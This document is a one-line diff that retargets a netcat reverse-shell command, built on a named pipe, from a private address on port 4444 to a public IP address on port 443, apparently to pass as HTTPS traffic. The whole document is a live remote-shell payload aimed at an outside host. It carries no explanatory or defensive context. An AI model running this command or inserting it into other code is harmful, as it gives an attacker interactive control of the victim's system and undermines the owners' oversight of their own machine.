@@ -1,1 +1,1 @@
-mkfifo /tmp/txrit; nc 192.168.123.100 4444 0</tmp/txrit | /bin/sh >/tmp/txrit 2>&1; rm /tmp/txrit
+mkfifo /tmp/txrit; nc 3.35.10.95 443 </tmp/txrit | /bin/sh >/tmp/txrit 2>&1; rm /tmp/txrit
